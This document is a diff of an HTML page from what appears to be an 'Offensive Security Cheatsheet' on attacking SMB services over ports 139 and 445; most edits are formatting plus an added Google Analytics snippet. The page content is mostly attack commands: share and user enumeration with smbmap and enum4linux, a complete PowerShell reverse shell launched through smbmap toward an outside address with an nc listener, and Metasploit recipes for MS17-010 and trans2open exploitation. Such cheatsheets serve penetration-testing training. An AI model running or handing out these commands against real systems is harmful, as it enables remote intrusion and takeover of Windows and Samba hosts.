@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:53 CEST">
+<meta name="revised" content="2023-02-14T12:07:00 CET">
 <title>139/445 - SMB :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1834,14 +1863,12 @@
     
     
     
-    
-
-<h3 id="general-informations">General Informations</h3>
+    <h3 id="general-informations">General Informations</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">SMB1</span> <span style="color:#f92672">=</span>&gt; Win2000 / XP / <span style="color:#ae81ff">2003</span>
 SMB2.0 <span style="color:#f92672">=</span>&gt; Vista / <span style="color:#ae81ff">2008</span>
 SMB2.1 <span style="color:#f92672">=</span>&gt; Win7 / 2008R2
 SMB3.0 <span style="color:#f92672">=</span>&gt; Win8 /  <span style="color:#ae81ff">2012</span>
-SMB <span style="color:#ae81ff">3</span>.02 <span style="color:#f92672">=</span>&gt; Win8.1 / 2012R2
+SMB 3.02 <span style="color:#f92672">=</span>&gt; Win8.1 / 2012R2
 
 <span style="color:#75715e"># Configuration tips</span>
 <span style="color:#75715e"># Can be usefull to configure /etc/samba/smb.conf with:</span>
@@ -1849,9 +1876,8 @@ client min <span style="color:#111">protocol</span> <span style="color:#f92672">
 client max <span style="color:#111">protocol</span> <span style="color:#f92672">=</span> SMB3
 
 <span style="color:#75715e"># Then</span>
-service smbd restart</code></pre></div>
-<p><br/></p>
-
+service smbd restart
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="identification">Identification</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Port 139</span>
 <span style="color:#75715e"># Using nbtscan to identify host/domain</span>
@@ -1862,7 +1888,7 @@ use auxiliary/scanner/smb/smb2
 <span style="color:#111">set</span> RHOST IP
 run
 
-<span style="color:#75715e"># Discover real samba version if hidden</span>     
+<span style="color:#75715e"># Discover real samba version if hidden     </span>
 ngrep -i -d tap0 ‘s.?a.?m.?b.?a.*<span style="color:#f92672">[[</span>:digit:<span style="color:#f92672">]]</span>’ <span style="color:#111">&amp;</span> smbclient -L //IP
 
 
@@ -1907,16 +1933,15 @@ smb-vuln-ms07-029 <span style="color:#f92672">(</span>Buffer overflow which can 
 smb-vuln-ms08-067 <span style="color:#f92672">(</span>Buffer overflow/RCE. Dangerous, can crash the target<span style="color:#f92672">)</span>
 smb-vuln-ms10-054 <span style="color:#f92672">(</span>Remote Memory Corruption. Result is BSOD -&gt; DANGEROUS<span style="color:#f92672">)</span>
 smb-vuln-ms10-061 <span style="color:#f92672">(</span>Print vulnerability. Safe and can<span style="color:#8045ff">\&#39;</span>t crash the target<span style="color:#f92672">)</span>
-smb-vuln-ms17-010 <span style="color:#f92672">(</span>RCE, just checking <span style="color:#00a8c8">if</span> vulnerable<span style="color:#f92672">)</span></code></pre></div>
-<p><br/></p>
-
+smb-vuln-ms17-010 <span style="color:#f92672">(</span>RCE, just checking <span style="color:#00a8c8">if</span> vulnerable<span style="color:#f92672">)</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="enumeration">Enumeration</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Get NetBIOS from IP</span>
 nmblookup -A &lt;IP&gt;
 
 
 <span style="color:#75715e"># Enumeration using enum4linux</span>
-enum4linux -a -R <span style="color:#ae81ff">500</span>-600,950-1150  <span style="color:#f92672">(</span>identifier le nom/domaine + users + shares<span style="color:#f92672">)</span>
+enum4linux -a -R 500-600,950-1150  <span style="color:#f92672">(</span>identifier le nom/domaine + users + shares<span style="color:#f92672">)</span>
 
 
 <span style="color:#75715e"># Smbclient</span>
@@ -1934,52 +1959,50 @@ smbclient -U “” -N <span style="color:#8045ff">\\\\</span>IP<span style="col
 
 <span style="color:#75715e"># Nullinux for users and shares</span>
 nullinux -users -quick DC1.Domain.net
-nullinux -all <span style="color:#ae81ff">192</span>.168.0.0-5
-nullinux -shares -U <span style="color:#d88200">&#39;Domain\User&#39;</span> -P <span style="color:#d88200">&#39;Password1&#39;</span> <span style="color:#ae81ff">10</span>.0.0.1,10.0.0.5
+nullinux -all 192.168.0.0-5
+nullinux -shares -U <span style="color:#d88200">&#39;Domain\User&#39;</span> -P <span style="color:#d88200">&#39;Password1&#39;</span> 10.0.0.1,10.0.0.5
 
 
 <span style="color:#75715e"># Smbmap for domains (List share drives, drive permissions, share contents, upload/download functionality..)</span>
 <span style="color:#75715e"># Basic enumeration (password or NTLM hash)</span>
-python smbmap.py -u jsmith -p password1 -d workgroup -H <span style="color:#ae81ff">192</span>.168.0.1
+python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1
 
 <span style="color:#75715e"># Remote command execution</span>
-python smbmap.py -u <span style="color:#d88200">&#39;apadmin&#39;</span> -p <span style="color:#d88200">&#39;asdf1234!&#39;</span> -d ACME -H <span style="color:#ae81ff">10</span>.1.3.30 -x <span style="color:#d88200">&#39;net group &#34;Domain Admins&#34; /domain&#39;</span>
+python smbmap.py -u <span style="color:#d88200">&#39;apadmin&#39;</span> -p <span style="color:#d88200">&#39;asdf1234!&#39;</span> -d ACME -H 10.1.3.30 -x <span style="color:#d88200">&#39;net group &#34;Domain Admins&#34; /domain&#39;</span>
 
 <span style="color:#75715e"># Non-recursive path listing</span>
-python smbmap.py -H <span style="color:#ae81ff">172</span>.16.0.24 -u Administrator -p <span style="color:#d88200">&#39;changeMe&#39;</span> -r <span style="color:#d88200">&#39;C$\Users&#39;</span>
+python smbmap.py -H 172.16.0.24 -u Administrator -p <span style="color:#d88200">&#39;changeMe&#39;</span> -r <span style="color:#d88200">&#39;C$\Users&#39;</span>
 
 <span style="color:#75715e"># File content searching</span>
 python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p <span style="color:#d88200">&#39;NopSec1234!&#39;</span> -d widgetworld -F <span style="color:#d88200">&#39;[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]&#39;</span>
 
 <span style="color:#75715e"># Drive listing</span>
-python smbmap.py -H <span style="color:#ae81ff">192</span>.168.1.24 -u Administrator -p <span style="color:#d88200">&#39;R33nisP!nckle&#39;</span> -L 
+python smbmap.py -H 192.168.1.24 -u Administrator -p <span style="color:#d88200">&#39;R33nisP!nckle&#39;</span> -L 
 
 <span style="color:#75715e"># Nifty Shell</span>
-python smbmap.py -u jsmith -p <span style="color:#d88200">&#39;R33nisP!nckle&#39;</span> -d ABC -H <span style="color:#ae81ff">192</span>.168.2.50 -x <span style="color:#d88200">&#39;powershell -command &#34;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=&#34;&#34;&#34;&#34;1.1.1.1&#34;&#34;&#34;&#34;; $port=&#34;&#34;&#34;&#34;4445&#34;&#34;&#34;&#34;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=&#34;&#34;&#34;&#34;cmd.exe&#34;&#34;&#34;&#34;  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=&#34;&#34;&#34;&#34; &#34;&#34;&#34;&#34;}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};&#34;&#39;</span> 
+python smbmap.py -u jsmith -p <span style="color:#d88200">&#39;R33nisP!nckle&#39;</span> -d ABC -H 192.168.2.50 -x <span style="color:#d88200">&#39;powershell -command &#34;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=&#34;&#34;&#34;&#34;1.1.1.1&#34;&#34;&#34;&#34;; $port=&#34;&#34;&#34;&#34;4445&#34;&#34;&#34;&#34;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=&#34;&#34;&#34;&#34;cmd.exe&#34;&#34;&#34;&#34;  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=&#34;&#34;&#34;&#34; &#34;&#34;&#34;&#34;}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};&#34;&#39;</span> 
 
 <span style="color:#75715e"># Attackers</span>
-nc -l <span style="color:#ae81ff">4445</span></code></pre></div>
-<p><br/></p>
-
+nc -l <span style="color:#ae81ff">4445</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="ms17-010-exploitation">MS17-010 Exploitation</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using metasploit</span>   
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using metasploit   </span>
 <span style="color:#f92672">(</span>IMPORTANT MS17_010_PSEXEC is a staged payload, means you need meterpreter !<span style="color:#f92672">)</span>
-<span style="color:#f92672">(</span>IMPORTANT <span style="color:#ae81ff">2</span>, <span style="color:#00a8c8">if</span> object can<span style="color:#8045ff">\&#39;</span>t be found, try to modify your target !<span style="color:#f92672">)</span>
+<span style="color:#f92672">(</span>IMPORTANT 2, <span style="color:#00a8c8">if</span> object can<span style="color:#8045ff">\&#39;</span>t be found, try to modify your target !<span style="color:#f92672">)</span>
 use exploit/windows/smb/ms17_010_psexec
 <span style="color:#111">set</span> SHARE ADMIN$
 <span style="color:#111">set</span> SMBDomain ALICE
 <span style="color:#111">set</span> ALLOW_GUEST <span style="color:#111">true</span>
 <span style="color:#111">set</span> LPORT <span style="color:#ae81ff">445</span>
-<span style="color:#111">set</span> LHOST <span style="color:#ae81ff">10</span>.11.0.179
-<span style="color:#111">set</span> RHOST <span style="color:#ae81ff">10</span>.11.1.5
+<span style="color:#111">set</span> LHOST 10.11.0.179
+<span style="color:#111">set</span> RHOST 10.11.1.5
 <span style="color:#111">set</span> TARGET <span style="color:#ae81ff">3</span>       <span style="color:#f92672">(</span>TARGET <span style="color:#111">1</span> <span style="color:#f92672">=</span> PowerShell / TARGET <span style="color:#111">2</span> <span style="color:#f92672">=</span> Native / TARGET <span style="color:#111">3</span> <span style="color:#f92672">=</span> <span style="color:#111">MOF</span> <span style="color:#f92672">=</span>&gt; besoin du share ADMIN$<span style="color:#f92672">)</span>
 <span style="color:#111">set</span> PAYLOAD windows/shell/reverse_tcp
 <span style="color:#111">set</span> VERBOSE <span style="color:#111">true</span>
 <span style="color:#111">set</span> DBGTRACE <span style="color:#111">true</span>
 <span style="color:#111">set</span> EXITFUNC thread
-exploit -j</code></pre></div>
-<p><br/></p>
-
+exploit -j
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="trans2open-exploitation">Trans2open Exploitation</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Samba 2.2.X are usually vulnerable to trans2open</span>
 <span style="color:#75715e"># Using metasploit</span>
@@ -1989,16 +2012,16 @@ use exploit/linux/samba/trans2open
 <span style="color:#111">set</span> RHOST IP
 <span style="color:#111">set</span> LPORT <span style="color:#ae81ff">443</span>
 <span style="color:#111">set</span> LHOST IP
-exploit -j -z</code></pre></div>
-<p><br/></p>
-
-<h3 id="samba-3-4-5-symlink-directory-traversal">Samba 3.4.5 Symlink Directory Traversal</h3>
+exploit -j -z
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="samba-345-symlink-directory-traversal">Samba 3.4.5 Symlink Directory Traversal</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can mount the root fiilesystem to a share you can access</span>
 https://www.exploit-db.com/exploits/33599
 
 <span style="color:#75715e"># Using metasploit</span>
 https://www.exploit-db.com/exploits/33598
-use auxiliary/admin/smb/samba_symlink/traversal</code></pre></div>
+use auxiliary/admin/smb/samba_symlink/traversal
+</code></pre></div>
 
     
     
